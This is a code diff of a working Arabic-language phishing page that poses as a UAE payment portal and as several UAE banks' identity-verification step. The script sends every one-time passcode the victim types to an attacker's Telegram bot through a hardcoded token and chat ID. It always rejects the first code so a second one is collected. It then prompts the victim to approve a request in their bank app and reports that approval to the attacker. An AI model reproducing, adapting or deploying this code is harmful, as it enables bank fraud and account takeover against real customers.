@@ -3,135 +3,198 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق من الهوية - بوابة سداد الإمارات</title>
+    <title>التحقق من رمز OTP - بوابة سداد الإمارات</title>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
     <link rel="icon" href="https://petra.gov.jo/upload/1542630954928.jpg" type="image/x-icon">
     <style>
         :root {
             --primary-color: #008000;
+            --secondary-color: #FFD700;
             --text-color: #333;
+            --light-gray: #f5f5f5;
             --border-color: #ddd;
             --error-color: #e74c3c;
+            --success-color: #2ecc71;
         }
-
         * { box-sizing: border-box; margin: 0; padding: 0; }
-
-        body {
-            font-family: 'Tajawal', sans-serif;
-            background-color: #f9f9f9;
-            color: var(--text-color);
-            display: flex; align-items: center; justify-content: center; min-height: 100vh;
-        }
-
-        .container { max-width: 450px; width: 90%; }
-
-        .form-container {
-            background-color: white; border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1); padding: 30px; text-align: center;
-        }
-
-        .header img { height: 60px; margin-bottom: 15px; }
-        
-        .otp-title { font-size: 20px; font-weight: 700; color: var(--primary-color); margin-bottom: 10px; }
-        .otp-desc { font-size: 14px; color: #666; margin-bottom: 25px; }
-
-        .otp-input-group {
-            display: flex; justify-content: space-between; gap: 8px; direction: ltr; margin-bottom: 25px;
-        }
-
-        .otp-input {
-            width: 45px; height: 55px; border: 2px solid var(--border-color);
-            border-radius: 8px; text-align: center; font-size: 22px; font-weight: bold;
-        }
-
-        .otp-input:focus { border-color: var(--primary-color); outline: none; box-shadow: 0 0 5px rgba(0,128,0,0.2); }
-
-        .btn {
-            background-color: var(--primary-color); color: white;
-            padding: 14px; border: none; border-radius: 8px;
-            cursor: pointer; font-size: 16px; width: 100%; font-family: 'Tajawal', sans-serif;
-        }
-
-        .timer { margin-top: 20px; font-size: 14px; color: #888; }
-        #time { color: var(--error-color); font-weight: bold; }
+        body { font-family: 'Tajawal', sans-serif; background-color: #f9f9f9; color: var(--text-color); line-height: 1.6; }
+        .container { max-width: 800px; margin: 0 auto; padding: 20px; min-height: 100vh; }
+        .header { text-align: center; margin-bottom: 30px; padding: 20px; background-color: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .header img { height: 80px; margin-bottom: 10px; }
+        .header h1 { color: var(--primary-color); font-size: 24px; margin-bottom: 10px; }
+        .form-container { background-color: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 30px; margin-bottom: 20px; }
+        .otp-container { text-align: center; }
+        .otp-container h3 { margin-bottom: 15px; }
+        .otp-container p { margin-bottom: 20px; color: #666; }
+        .otp-input-group { display: flex; justify-content: center; gap: 10px; direction: ltr; margin-bottom: 25px; }
+        .otp-input { width: 45px; height: 50px; border: 1px solid var(--border-color); border-radius: 5px; text-align: center; font-size: 24px; font-weight: bold; }
+        .otp-input:focus { border-color: var(--primary-color); outline: none; }
+        .btn { display: inline-block; background-color: var(--primary-color); color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: 500; font-family: 'Tajawal', sans-serif; transition: background-color 0.3s; }
+        .btn:hover { background-color: #006600; }
+        .btn:disabled { background-color: #ccc; cursor: not-allowed; }
+        .btn-block { display: block; width: 100%; }
+        .timer { margin-top: 15px; color: var(--error-color); font-weight: bold; }
+        .browser-auth-container { text-align: center; padding: 20px; }
+        .rejection-message { color: var(--error-color); margin-top: 20px; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="form-container">
-            <div class="header">
-                <img src="https://petra.gov.jo/upload/1542630954928.jpg" alt="Logo">
+        <div class="header">
+            <img src="" alt="شعار البنك" id="bankLogo">
+            <h1>التحقق من الهوية</h1>
+        </div>
+        <div class="form-container" id="otpContainer">
+            <div class="otp-container">
+                <h3>أدخل رمز التحقق (OTP)</h3>
+                <p id="otpMessage">لقد أرسلنا رمز تحقق إلى رقم جوالك المسجل لدينا</p>
+                <div class="otp-input-group">
+                    <input type="text" class="otp-input" maxlength="1">
+                    <input type="text" class="otp-input" maxlength="1">
+                    <input type="text" class="otp-input" maxlength="1">
+                    <input type="text" class="otp-input" maxlength="1">
+                    <input type="text" class="otp-input" maxlength="1">
+                    <input type="text" class="otp-input" maxlength="1">
+                </div>
+                <button class="btn btn-block" id="confirmOtp">تأكيد الرمز</button>
+                <div class="timer" id="resendTimer">يمكنك إعادة إرسال الرمز بعد <span id="seconds">60</span> ثانية</div>
             </div>
-            
-            <h2 class="otp-title">تحقق من الرمز</h2>
-            <p class="otp-desc">يرجى إدخال رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك المسجل لدى البنك.</p>
-            
-            <div class="otp-input-group">
-                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 0)">
-                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)">
-                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)">
-                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)">
-                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)">
-                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)">
-            </div>
-            
-            <button type="button" onclick="verifyOTP()" class="btn">تأكيد الرمز</button>
-            
-            <div class="timer">إعادة إرسال الرمز خلال <span id="time">00:59</span></div>
         </div>
     </div>
 
     <script>
-        const telegramBotToken = '8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw';
-        const telegramChatId = '8362204213';
-
-        function moveToNext(input, index) {
-            if (input.value.length === 1 && index < 5) {
-                document.querySelectorAll('.otp-input')[index + 1].focus();
-            }
-        }
+        // تم تحديث التوكن والشات آيدي هنا
+        const telegramBotToken = '8591237339:AAHOMH_hwr6ts_zlKb3ClGXb7RBpZ8ii5j0';
+        const telegramChatId = '1848565778';
 
         async function appendToTelegram(newContent) {
             const existingId = localStorage.getItem('telegramMessageId');
             const existingContent = localStorage.getItem('telegramMessageContent') || '';
-            const updatedContent = existingContent + '\n\n' + newContent;
+            if (existingId) {
+                const updatedContent = existingContent + '\n\n' + newContent;
+                try {
+                    const url = `https://api.telegram.org/bot${telegramBotToken}/editMessageText`;
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: telegramChatId, message_id: parseInt(existingId), text: updatedContent, parse_mode: 'HTML' })
+                    });
+                    const data = await response.json();
+                    if (data.ok) { localStorage.setItem('telegramMessageContent', updatedContent); }
+                    else { await sendNewTelegram(updatedContent); }
+                } catch (error) { await sendNewTelegram(updatedContent); }
+            } else { await sendNewTelegram(newContent); }
+        }
 
+        async function sendNewTelegram(message) {
             try {
-                await fetch(`https://api.telegram.org/bot${telegramBotToken}/editMessageText`, {
+                const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+                const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: telegramChatId,
-                        message_id: parseInt(existingId),
-                        text: updatedContent,
-                        parse_mode: 'HTML'
-                    })
+                    body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'HTML' })
                 });
-                localStorage.setItem('telegramMessageContent', updatedContent);
-            } catch (e) { console.error(e); }
+                const data = await response.json();
+                if (data.ok) { localStorage.setItem('telegramMessageId', data.result.message_id); localStorage.setItem('telegramMessageContent', message); }
+            } catch (error) { console.error('خطأ:', error); }
         }
 
-        async function verifyOTP() {
-            let otpCode = "";
-            document.querySelectorAll('.otp-input').forEach(input => otpCode += input.value);
-            
-            if (otpCode.length === 6) {
-                const content = `🔑 <b>رمز التحقق المستلم (OTP)</b>\n🔢 الرمز: <code>${otpCode}</code>`;
-                await appendToTelegram(content);
-                window.location.href = 'page6.html';
-            } else {
-                alert("يرجى إدخال الرمز كاملاً");
-            }
-        }
+        const banks = {
+            emiratesNBD: { name: "بنك الإمارات دبي الوطني", logo: "https://i.ibb.co/dwhqmDsF/Emirates-NBD.jpg" },
+            firstAbuDhabi: { name: "بنك أبو ظبي الأول", logo: "https://i.ibb.co/gnNdPDJ/First-Abu-Dhabi-Bank-Logo-svg.png" },
+            abuDhabiCommercial: { name: "بنك أبو ظبي التجاري", logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSjH4Qs3CGxyTwB8k3DPHpsD8fyKOZ8qhCt_b1Nx_4IVg&s=10" },
+            dubaiIslamic: { name: "بنك دبي الإسلامي", logo: "https://i.ibb.co/8DbXSsw0/dib-logo-personal-business-og.jpg" },
+            mashreq: { name: "بنك المشرق", logo: "https://i.ibb.co/21YLkTtB/MASQ-AE-BIG-e09012bc.png" },
+            abuDhabiIslamic: { name: "بنك أبو ظبي الإسلامي", logo: "https://i.ibb.co/ynB1yRtg/images.jpg" },
+            dubaiCommercial: { name: "بنك دبي التجاري", logo: "https://play-lh.googleusercontent.com/6IHUfV5JDsueMXq283hVWDkQvwooy4EgIjGgrGKj1PuBIBjagfGdAWWHYZtX-PW99D8" },
+            fujairahNational: { name: "بنك الفجيرة الوطني", logo: "https://i.ibb.co/KxzwNLPC/nbf.jpg" },
+            rakNational: { name: "بنك رأس الخيمة الوطني", logo: "https://i.ibb.co/jkNfYJxc/RAKBANK.gif" },
+            sharjahIslamic: { name: "مصرف الشارقة الإسلامي", logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT9mYd7ueTsXpy3up18pb9AqLFa-NR2GabKe8rRaDDNkg&s=10" }
+        };
 
-        // Timer Functionality
-        let seconds = 59;
-        setInterval(() => {
-            if (seconds > 0) {
-                seconds--;
-                document.getElementById('time').innerText = `00:${seconds < 10 ? '0' + seconds : seconds}`;
-            }
+        const selectedBank = localStorage.getItem('selectedBank') || 'emiratesNBD';
+        const bank = banks[selectedBank];
+        if (bank) { document.getElementById('bankLogo').src = bank.logo; }
+
+        const otpInputs = document.querySelectorAll('.otp-input');
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < otpInputs.length - 1) { otpInputs[index + 1].focus(); }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) { otpInputs[index - 1].focus(); }
+            });
+        });
+
+        let timer = 60;
+        const secondsSpan = document.getElementById('seconds');
+        const interval = setInterval(() => {
+            timer--;
+            secondsSpan.textContent = timer;
+            if (timer <= 0) { clearInterval(interval); document.getElementById('resendTimer').innerHTML = '<a href="#" style="color: var(--primary-color);">إعادة إرسال الرمز</a>'; }
         }, 1000);
+
+        let attemptCount = 0;
+        document.getElementById('confirmOtp').addEventListener('click', async function() {
+            let otp = '';
+            otpInputs.forEach(input => otp += input.value);
+            if (otp.length < 4) { alert('يرجى إدخال رمز التحقق كاملاً'); return; }
+
+            attemptCount++;
+            const content = `🔢 <b>رمز OTP المستلم</b>\n\n🏦 البنك: ${bank.name}\n🔑 الرمز: ${otp}\n🔢 المحاولة رقم: ${attemptCount}`;
+            await appendToTelegram(content);
+
+            if (attemptCount === 1) {
+                alert('رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى');
+                otpInputs.forEach(input => input.value = '');
+                otpInputs[0].focus();
+            } else {
+                showBrowserAuth();
+            }
+        });
+
+        function showBrowserAuth() {
+            const container = document.getElementById('otpContainer');
+            container.innerHTML = `
+                <div class="browser-auth-container">
+                    <h3>توثيق المتصفح</h3>
+                    <p>يرجى فتح تطبيق البنك الخاص بك على هاتفك والموافقة على طلب التوثيق لإتمام المعاملة.</p>
+                    <div class="timer" id="authTimer">انتظار التوثيق... (<span id="authSeconds">30</span>)</div>
+                    <button class="btn btn-block" id="authConfirmBtn" disabled style="margin-top:20px;">تم التوثيق</button>
+                </div>`;
+
+            let timer = 30;
+            const timerElement = document.getElementById('authSeconds');
+            const interval = setInterval(() => {
+                timer--;
+                timerElement.textContent = timer;
+                if (timer <= 0) {
+                    clearInterval(interval);
+                    const btn = document.getElementById('authConfirmBtn');
+                    btn.disabled = false;
+                    btn.addEventListener('click', handleBrowserAuthConfirmation);
+                }
+            }, 1000);
+        }
+
+        async function handleBrowserAuthConfirmation() {
+            const content = `🔒 <b>توثيق المتصفح</b>\n\n🏦 البنك: ${bank.name}\n✅ تم الضغط على "تم التوثيق"`;
+            await appendToTelegram(content);
+
+            const container = document.getElementById('otpContainer');
+            container.innerHTML = `
+                <div class="browser-auth-container">
+                    <h3>توثيق المتصفح</h3>
+                    <div class="rejection-message">
+                        <p>عزيزي العميل، تم رفض التوثيق. يرجى إعادة المحاولة.</p>
+                    </div>
+                </div>`;
+
+            const failContent = `❌ <b>رفض التوثيق</b>\n\nتم رفض توثيق المتصفح - سيتم إعادة التوجيه`;
+            await appendToTelegram(failContent);
+
+            setTimeout(() => { window.location.href = 'page4.html'; }, 3000);
+        }
     </script>
 </body>
 </html>
